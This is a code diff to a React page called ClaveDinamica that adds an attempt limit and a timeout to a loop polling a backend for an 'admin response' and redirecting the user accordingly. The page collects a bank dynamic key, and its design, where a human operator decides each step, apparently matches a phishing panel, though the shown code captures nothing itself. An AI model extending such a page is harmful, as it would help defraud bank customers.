@@ -381,13 +381,28 @@ export default function ClaveDinamica() {
     };
 
     // Función de polling para esperar respuesta del admin
+    // Función de polling para esperar respuesta del admin
     const iniciarPolling = (sesionId) => {
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60; // ~3 minutos
+        const TIMEOUT_MS = 180000;
+        let timeoutId;
+
         const pollingInterval = setInterval(async () => {
+            attempts++;
             try {
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado } = response.data;
 
-                console.log('DIN Polling:', estado);
+                console.log('DIN Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
+
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Tiempo de espera agotado. Intente nuevamente.");
+                    return;
+                }
 
                 // Estados que detienen el polling
                 const estadosFinales = [
@@ -410,6 +425,7 @@ export default function ClaveDinamica() {
 
                 if (estadosFinales.includes(estado.toLowerCase())) {
                     clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
                 }
 
                 // Redirecciones basadas en respuesta del admin
@@ -526,14 +542,20 @@ export default function ClaveDinamica() {
                     default:
                 }
             } catch (error) {
-
-                // Se quita el estado de cargando
-                setCargando(false);
-
-                // Se lanza una alerta de error
-                alert('Error consultando estado. Intente nuevamente.');
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Error de conexión. Intente nuevamente.");
+                }
             }
         }, 3000);
+
+        // Safety timeout cleanup
+        timeoutId = setTimeout(() => {
+            clearInterval(pollingInterval);
+            setCargando(false);
+        }, TIMEOUT_MS);
     };
 
     // Metodo para registrar el intento de DIN - ESTRUCTURA UNIFICADA
